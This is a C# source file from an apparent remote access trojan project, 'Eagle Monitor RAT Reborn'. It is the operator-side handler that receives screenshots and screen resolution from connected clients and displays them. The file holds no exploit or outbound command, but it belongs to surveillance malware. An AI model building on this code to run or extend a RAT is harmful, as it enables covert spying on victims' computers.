using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RemoteViewerPacketHandler
    {
        public RemoteViewerPacketHandler(RemoteViewerPacket remoteViewerPacket) : base()
        {
            if (ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm != null)
            {
                ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
                {
                    try
                    {
                        ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.RemoteDesktopHandler.HasAlreadyConnected = true;
                        if (remoteViewerPacket.desktopPicture != null)
                        {
                            ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
                            ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.RemoteDesktopHandler.HResol = remoteViewerPacket.hResol;
                            ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.RemoteDesktopHandler.VResol = remoteViewerPacket.vResol;
                        }
                        return;
                    }
                    catch { }
                }));
            }
        }
    }
}